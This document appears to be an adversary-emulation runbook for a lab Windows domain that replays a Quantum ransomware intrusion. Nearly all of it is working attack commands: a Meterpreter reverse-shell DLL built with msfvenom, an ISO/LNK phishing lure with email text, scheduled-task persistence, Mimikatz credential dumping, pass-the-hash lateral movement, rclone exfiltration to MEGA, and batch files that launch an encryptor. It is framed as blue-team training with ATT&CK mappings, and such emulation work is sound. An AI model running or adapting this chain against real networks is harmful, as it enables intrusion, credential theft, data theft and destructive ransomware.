# Quantum Ransomware Scenario: Execution Plan

See `README.md` for overview and ATT&CK mapping. This document has the step-by-step commands.

---

## Quick Links to Required Tools

Before starting, ensure these tools are downloaded and available:

- **ImgBurn** (ISO creation): https://www.imgburn.com/
- **Proton Mail** (phishing delivery): https://account.proton.me
- **Metasploit Framework** (msfvenom, msfconsole): `apt install metasploit-framework`
- **Mimikatz** (credential dumping): https://github.com/gentilkiwi/mimikatz/releases
- **ADFind** (AD enumeration): http://www.joeware.net/freetools/tools/adfind/
- **psexec** (lateral movement): https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
- **rclone** (exfiltration): https://rclone.org/downloads/
- **evil-winrm** (WinRM C2): `gem install evil-winrm`
- **MEGA account** (cloud storage): https://mega.io/

---

## Infrastructure Setup

### On MORPHEUS (Attacker, Kali Linux)

**Install dependencies**
```bash
apt update && apt install -y metasploit-framework python3 python3-pip mingw-w64 wine
pip install impacket pycryptodome
```

**Create working directories**
```bash
mkdir -p /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware/{payloads,loot,logs,iso,tools}
cd /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware
```

**Download required tools**

| Tool | Download | Instructions |
|------|----------|--------------|
| **Metasploit** | `apt install metasploit-framework` | Pre-installed on Kali |
| **ImgBurn** | https://www.imgburn.com/ | For Windows; use `mkisofs` on Linux |
| **Mimikatz** | https://github.com/gentilkiwi/mimikatz/releases | Download x64 Release (mimikatz_trunk.zip) |
| **ADFind** | http://www.joeware.net/freetools/tools/adfind/ | Extract to `/tools/adfind.exe` |
| **psexec** | https://docs.microsoft.com/en-us/sysinternals/downloads/psexec | Download and extract to `/tools/` |
| **rclone** | https://rclone.org/downloads/ | Install: `apt install rclone` or `curl https://rclone.org/install.sh \| sudo bash` |
| **evil-winrm** | https://github.com/Hackplayers/evil-winrm | Install: `gem install evil-winrm` |
| **Impacket** | https://github.com/SecureAuthCorp/impacket | Already installed via pip (psexec, wmiexec tools) |

### On TRINITY/NEO/NEB/ZION (Windows targets)

- Domain-joined to `<DOMAIN_NAME>`
- Admin credentials: `Administrator` / `<LAB_ADMIN_PASSWORD>`
- Time synchronized (critical for Kerberos)
- Vision One agent monitoring (or equivalent EDR)
- Create test data folders:
  - TRINITY: `C:\Users\Administrator\Documents\Company_Data_Top_Secret\`
  - NEB: `C:\Company_Data_Top_Secret\`
  - ZION: `C:\Users\Administrator\Documents\`

---

## Pre-Execution Checklist

- [ ] All VMs network connectivity verified (ping each other)
- [ ] Time synchronized across all hosts
- [ ] Test data created (sensitive documents in Documents folders)
- [ ] Port scan: `nmap -p 135,139,445,3389,5985,5986 172.20.43.X`
- [ ] Meterpreter listener ready
- [ ] Proton Mail account ready with test email recipient (`<TARGET_EMAIL_ACCOUNT>`)
- [ ] rclone configured with MEGA account

---

## PHASE 1: Reconnaissance

### Information Gathering

**On MORPHEUS, enumerate targets**
```bash
# Gather basic network info
nmap -sN 172.20.43.0/24

# Check which targets are reachable
for ip in 172.20.43.10 172.20.43.20 172.20.43.30 172.20.43.40 172.20.43.50; do
  echo "Testing $ip"
  ping -c 1 $ip
done

# Identify open ports on targets
nmap -p 135,139,445,3389,5985,5986 -Pn 172.20.43.20 172.20.43.30 172.20.43.40 172.20.43.50
```

**Expected outcome:**
- ✅ Network map of all targets
- ✅ Confirmed open SMB (445), RPC (135), WinRM (5985), RDP (3389)

---

## PHASE 2: Weaponization

### Step 1: Create Malicious DLL (IceID Emulation)

**On MORPHEUS, generate Meterpreter DLL**
```bash
cd /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware/payloads

msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=172.20.43.5 \
  LPORT=443 \
  -f dll \
  -o agent_smith.dll

# Note: Port 443 in real scenario; use 1337 if env has restrictions
# For this lab, we'll use port 443
```

**Verify payload**
```bash
ls -lh agent_smith.dll
file agent_smith.dll
```

### Step 2: Create Shortcut File

**On TRINITY (via RDP or physical access), create the LNK file**
```powershell
# Via PowerShell (if building on Windows)
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Temp\document.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\rundll32.exe"
$Shortcut.Arguments = "E:\agent_smith.dll,DllRegisterServer"
$Shortcut.Save()
```

Alternatively, use a GUI shortcut editor or Windows shortcut builder.

**Expected structure:**
```
ISO Contents:
├── agent_smith.dll
└── document.lnk
    └─ Target: C:\Windows\System32\rundll32.exe E:\agent_smith.dll,DllRegisterServer
```

### Step 3: Create ISO Image

**On MORPHEUS, generate ISO**
```bash
cd /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware

# Using mkisofs (Linux alternative to ImgBurn)
mkisofs -o agent_smith_invoice_173.iso \
  -V "Invoice" \
  payloads/agent_smith.dll \
  payloads/document.lnk

# Verify ISO
ls -lh agent_smith_invoice_173.iso
```

**Expected outcome:**
- ✅ ISO file ~50–100 KB
- ✅ Contains DLL + LNK file

---

## PHASE 3: Delivery

### Send Phishing Email

**On MORPHEUS (or any web browser)**

1. **Create temporary Proton Mail account** (or use organization's approved account)
   - Go to https://account.proton.me
   - Sign up: `<PROTON_EMAIL>`
   - Password: `<PROTON_PASSWORD>`

2. **Compose spear phishing email**
   ```
   To: <TARGET_EMAIL_ACCOUNT>
   Subject: Invoice MDR-2026-173 - URGENT
   
   Body:
   Dear [Target Name],
   
   Please find attached the latest MDR invoice for your review.
   Please open and download the file to verify the details.
   
   Best regards,
   Billing Department
   ```

3. **Attach ISO file**
   - Attach: `agent_smith_invoice_173.iso`
   - Send to: `<TARGET_EMAIL_ACCOUNT>`

**Expected outcome:**
- ✅ Email delivered to target inbox

---

## PHASE 4: Exploitation

### Step 1: Set Up Meterpreter Listener

**On MORPHEUS, start listener**
```bash
msfconsole -q -x "
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 172.20.43.5
set LPORT 443
exploit -j
"

# Or manually in msfconsole:
# msf6 > use exploit/multi/handler
# msf6 > set payload windows/meterpreter/reverse_tcp
# msf6 > set LHOST 172.20.43.5
# msf6 > set LPORT 443
# msf6 > exploit -j
```

### Step 2: Trigger Payload on Target

**On TRINITY (target machine)**

1. **Open email client** and download phishing email
2. **Download attachment** `agent_smith_invoice_173.iso`
3. **Mount ISO** (double-click or right-click → Mount)
4. **Execute shortcut** → Right-click `document.lnk` → Run as Administrator
   - This triggers: `rundll32.exe E:\agent_smith.dll,DllRegisterServer`
5. **Meterpreter session established** ← Check MORPHEUS console

**On MORPHEUS, verify beacon callback**
```bash
msf6 > sessions
# Expected:
# ID=1, meterpreter x86/windows, NT AUTHORITY\SYSTEM @ TRINITY
```

**Expected outcome:**
- ✅ Meterpreter session on TRINITY (ID=1)
- ✅ SYSTEM-level or Administrator-level access

---

## PHASE 5: Installation (Persistence)

### Step 1: Establish Persistence via Scheduled Task

**On TRINITY (Meterpreter session)**

```bash
meterpreter > load powershell
meterpreter > powershell_shell
```

**In PowerShell context:**
```powershell
# First, confirm access
whoami

# Create persistence folder
mkdir "C:\Users\Administrator\AppData\Local\Administrator"

# Copy malicious DLL from ISO to persistence location
Copy-Item "E:\agent_smith.dll" -Destination "C:\Users\Administrator\AppData\Local\Administrator\agent_smith.dll"

# Create scheduled task for daily persistence
$A = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "C:\Users\Administrator\AppData\Local\Administrator\agent_smith.dll,DllRegisterServer"
$T = New-ScheduledTaskTrigger -Daily -At 9am
$D = New-ScheduledTask -Action $A -Trigger $T
Register-ScheduledTask "Administrator_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A}" -InputObject $D

# Verify persistence
Get-ScheduledTask -TaskName "Administrator_*"
```

**Exit PowerShell**
```powershell
# Press Ctrl+C to exit PowerShell
```

### Step 2: Verify Persistence

**On TRINITY (in Meterpreter)**
```bash
meterpreter > shell
C:\> tasklist /v | find "rundll32"
C:\> exit
```

**Expected outcome:**
- ✅ Scheduled task created
- ✅ Persistent backdoor will re-execute daily

---

## PHASE 6: Command & Control (Discovery & Credential Access)

### Step 1: Network Discovery

**On TRINITY (Meterpreter session), perform ping sweep**

```bash
meterpreter > powershell_shell
```

**In PowerShell:**
```powershell
# Ping sweep to find active hosts
0..254 | % {echo $_; ping -n 1 -w 100 172.20.43.$_ | Select-String ttl} > C:\ProgramData\Perflogs\PingSweep.txt

# View results
Get-Content C:\ProgramData\Perflogs\PingSweep.txt -Tail 20
```

**Expected output:**
```
172.20.43.5 (MORPHEUS - attacker, won't respond)
172.20.43.20 (NEO - should reply)
172.20.43.30 (NEB - should reply)
172.20.43.40 (ZION - DC, should reply)
```

### Step 2: DNS Resolution & Hostname Mapping

**On MORPHEUS, create dns.ps1 script**
```bash
cat > /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware/dns.ps1 << 'EOFPOWERSHELL'
# DNS enumeration script
$ips = @("172.20.43.20", "172.20.43.30", "172.20.43.40")
foreach ($ip in $ips) {
    try {
        [System.Net.Dns]::GetHostByAddress($ip) | Select-Object HostName
    } catch {
        "Failed to resolve: $ip"
    }
}
EOFPOWERSHELL
```

**Upload dns.ps1 to target**
```bash
meterpreter > upload /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware/dns.ps1 C:\\ProgramData\\Perflogs\\dns.ps1
```

**Execute on TRINITY**
```bash
meterpreter > powershell_shell
```

**In PowerShell:**
```powershell
cd C:\ProgramData\Perflogs
.\dns.ps1 > resolve-dns.txt
Get-Content resolve-dns.txt
```

**Expected outcome:**
- ✅ Hostnames for TRINITY, NEO, NEB, ZION extracted

### Step 3: Enumerate AD via ADFind

**Upload ADFind to target**
```bash
meterpreter > upload /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware/adfind.exe C:\\ProgramData\\Perflogs\\adfind.exe
```

**Execute ADFind**
```bash
meterpreter > shell
C:\ProgramData\Perflogs> adfind.exe -default -f "(objectCategory=computer)" cn sAMAccountName > ad_computers.txt
C:\ProgramData\Perflogs> adfind.exe -default -f "(objectCategory=user)" cn sAMAccountName > ad_users.txt
C:\ProgramData\Perflogs> exit
```

**Download results**
```bash
meterpreter > download C:\\ProgramData\\Perflogs\\ad_computers.txt /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware/loot/
meterpreter > download C:\\ProgramData\\Perflogs\\ad_users.txt /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware/loot/
```

**Expected outcome:**
- ✅ List of domain computers
- ✅ List of domain users with SIDs

### Step 4: Credential Dumping via Mimikatz

**Upload Mimikatz to target**
```bash
meterpreter > upload /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware/mimikatz.exe C:\\ProgramData\\Perflogs\\mimikatz.exe
```

**Run Mimikatz**
```bash
meterpreter > shell
C:\ProgramData\Perflogs> mimikatz.exe
```

**In Mimikatz prompt:**
```
mimikatz # log
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # exit
```

**Expected output:**
```
Domain : <DOMAIN_NAME>
Username : Administrator
NTLM : [HASH]
SHA1 : [HASH]
```

**Download Mimikatz log**
```bash
meterpreter > download C:\\ProgramData\\Perflogs\\mimikatz.log /home/test/Desktop/Adversary_Profiles/Quantum_Ransomware/loot/
```

**Expected outcome:**
- ✅ Administrator credentials + hashes extracted
- ✅ Credentials ready for lateral movement

---

## PHASE 7: Lateral Movement & Exfiltration

### Step 1: Lateral Movement to NEO

**On MORPHEUS, use extracted credentials**
```bash
# Option A: Via psexec with password hash
impacket-psexec -hashes :NTLM_HASH <DOMAIN_NAME>/Administrator@172.20.43.20 cmd.exe

# Option B: Via WMI (wmiexec)
impacket-wmiexec <DOMAIN_NAME>/Administrator@172.20.43.20 cmd.exe

# Option C: Via PowerShell Remoting (if WinRM enabled)
evil-winrm -i 172.20.43.20 -u Administrator -p '<LAB_ADMIN_PASSWORD>'
```

**At remote shell (NEO), confirm access and create persistence**
```cmd
C:\> whoami
DOMAIN\Administrator

C:\> mkdir C:\ProgramData\Perflogs

# Copy IceID DLL to NEO for persistence
C:\> copy "\\172.20.43.20\C$\Users\Administrator\AppData\Local\Administrator\agent_smith.dll" C:\ProgramData\Perflogs\agent_smith.dll

# Create scheduled task on NEO
C:\> powershell
PS> $A = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "C:\ProgramData\Perflogs\agent_smith.dll,DllRegisterServer"
PS> $T = New-ScheduledTaskTrigger -Daily -At 9am
PS> $D = New-ScheduledTask -Action $A -Trigger $T
PS> Register-ScheduledTask "SystemUpdate" -InputObject $D
```

### Step 2: Data Collection from File Server (NEB)

**Repeat lateral movement to NEB (172.20.43.30)**
```bash
impacket-psexec -hashes :NTLM_HASH <DOMAIN_NAME>/Administrator@172.20.43.30 cmd.exe
```

**On NEB, identify sensitive data**
```cmd
C:\> dir "C:\Company_Data_Top_Secret\"
C:\> dir "C:\Users\*\Documents\*.xlsx"
C:\> dir "C:\Users\*\Documents\*.docx"
```

### Step 3: Data Exfiltration via rclone

**On MORPHEUS, configure rclone with MEGA**
```bash
rclone config

# When prompted:
# Name: RemoteTest
# Storage type: mega
# Email: <MEGA_EMAIL>
# Password: <MEGA_PASSWORD>
```

**Copy data from NEB to rclone**
```bash
# Mount or access NEB shares
rclone copy "\\172.20.43.30\Company_Data_Top_Secret" RemoteTest:TC2026_Data

# Verify upload
rclone ls RemoteTest:TC2026_Data
```

**Expected outcome:**
- ✅ Sensitive data uploaded to cloud (MEGA)
- ✅ Complete copy of exfiltrated files

---

## PHASE 8: Impact (Ransomware Deployment)

⚠️ **WARNING: This phase is DESTRUCTIVE. Only execute in isolated lab environment.**

### Step 1: Prepare Ransomware Delivery

**On MORPHEUS, prepare batch files for deployment**

Create `netuse.bat`:
```batch
@echo off
net use z: \\172.20.43.30\Company_Data_Top_Secret /user:<DOMAIN_NAME>\Administrator <LAB_ADMIN_PASSWORD>
```

Create `copy.bat`:
```batch
@echo off
copy "\\172.20.43.5\ransomware\ttsell.exe" "z:\"
copy "\\172.20.43.5\ransomware\ttsell.exe" "C:\ProgramData\Perflogs\"
```

Create `deploy.bat`:
```batch
@echo off
C:\ProgramData\Perflogs\ttsell.exe
```

### Step 2: Deploy Ransomware

**On NEB (via lateral movement), execute deployment**
```cmd
C:\> netuse.bat
C:\> copy.bat
C:\> deploy.bat
```

**Verify encryption**
```cmd
C:\> dir "z:\Company_Data_Top_Secret" /S
# All files should now have .encrypted extension or modified content
```

**Expected outcome:**
- ✅ All files on NEB encrypted
- ✅ Ransom note displayed
- ⚠️ Data loss is permanent

---

## Troubleshooting

### Meterpreter Beacon Not Calling Back
- ✅ Verify MORPHEUS listener is running: `msf6 > jobs`
- ✅ Confirm firewall allows outbound 443 on TRINITY
- ✅ Check ISO mounts correctly: `Get-Volume` on TRINITY
- ✅ Verify rundll32 executed: Check Event Viewer > Windows Logs > System
- **Fix:** Re-execute `document.lnk` with elevated privileges

### Lateral Movement Fails (Access Denied)
- ✅ Verify credentials with Mimikatz output
- ✅ Check time sync: `net time \\172.20.43.40 /set /yes`
- ✅ Confirm target is reachable: `ping 172.20.43.20`
- ✅ Test SMB connectivity: `nmap -p 445 172.20.43.20`
- **Fix:** Re-run credential dumping (Mimikatz) or use plaintext password with `-p` flag

### ADFind Produces No Output
- ✅ Verify network AD connectivity: `nslookup <DOMAIN_NAME> 172.20.43.40`
- ✅ Confirm TRINITY is domain-joined: `echo %USERDOMAIN%`
- ✅ Check ADFind syntax: `adfind.exe -default -f "(objectCategory=computer)" cn`
- **Fix:** Ensure TRINITY has line-of-sight to DC (ZION)

### Mimikatz "Access Denied" Error
- ✅ Confirm Meterpreter session is SYSTEM level: `getuid` in Meterpreter
- ✅ Run `privilege::debug` before `sekurlsa::logonpasswords`
- ✅ Verify no antivirus is blocking Mimikatz
- **Fix:** Re-execute initial payload with `Run as Administrator`

### rclone Upload Fails
- ✅ Test MEGA credentials: `rclone ls RemoteTest:`
- ✅ Verify network connectivity: `ping mega.nz`
- ✅ Check disk space on MEGA account
- **Fix:** Re-run `rclone config` with correct MEGA email/password

### Vision One Shows No Alerts
- ✅ Wait 2–5 minutes for telemetry ingestion
- ✅ Verify agent is running: `tasklist | find "trend"`
- ✅ Check time sync (reject events >5min old): `date /t & time /t`
- ✅ Confirm agent is monitoring C:\ProgramData\Perflogs\ path
- **Fix:** Restart Vision One agent or allow additional ingestion time

---

## Expected Outcome

✅ **PHASE 2–5 (Core Chain):** 1–2 hours
- Weaponization (ISO creation)
- Delivery (phishing email)
- Exploitation (beacon callback)
- Persistence (scheduled task)
- **Expected alerts:** 10–15 across initial access, execution, persistence

✅ **PHASE 6–7 (Full Discovery + Exfiltration):** 1–2 hours additional
- AD enumeration
- Credential dumping
- Lateral movement to NEO/NEB
- Data exfiltration
- **Expected alerts:** 20–30 total across discovery, credential access, exfiltration

✅ **PHASE 8 (Impact - OPTIONAL):** 30 minutes additional
- Ransomware deployment
- File encryption
- **Expected alerts:** 5–10 for encryption activity

**Total expected timeline:** 2–6 hours depending on depth

---

## Key Observations for Blue Team

- **T1566.001 (Spear Phishing Attachment):** ISO delivered via email
- **T1204.002 (User Execution):** User mounts ISO and executes LNK
- **T1204.003 (LNK → rundll32 execution):** Shortcut triggers DLL loading
- **T1547.001 (Scheduled Task Persistence):** Runs daily at 9am
- **T1087.002 (Domain Account Enumeration):** ADFind queries AD
- **T1003.001 (Credential Dumping):** Mimikatz extracts NTLM hashes
- **T1021.002 (SMB/Windows Admin Shares):** psexec lateral movement
- **T1560.001 (Archive Data):** Files collected for exfiltration
- **T1567 (Exfil over Web Service):** rclone uploads to MEGA
- **T1486 (Ransomware):** ttsell.exe encrypts all files

---

---

## Quick References & Tool Links

**Threat Intelligence**
- [DFIR Report (Analysis of actual Quantum campaigns)](https://thedfirreport.com/)
- [MITRE ATT&CK Framework](https://attack.mitre.org)

**Exploitation & C2**
- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- [Msfvenom Payload Generator](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [Cobalt Strike (Commercial C2)](https://www.cobaltstrike.com/)

**Credential Access**
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Guide](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-ntlm-hashes-with-mimikatz)

**Lateral Movement**
- [Impacket Tools (psexec, wmiexec)](https://github.com/SecureAuthCorp/impacket)
- [evil-winrm GitHub](https://github.com/Hackplayers/evil-winrm)
- [ADFind Tool](http://www.joeware.net/freetools/tools/adfind/)

**Exfiltration**
- [rclone Documentation](https://rclone.org/)
- [rclone MEGA Configuration](https://rclone.org/mega/)
- [Proton Mail](https://account.proton.me)

**Media Creation**
- [ImgBurn Tutorial](https://www.imgburn.com/)
- [Linux mkisofs Manual](https://linux.die.net/man/8/mkisofs)

---

**For Training Use Only — Authorized Personnel Only**
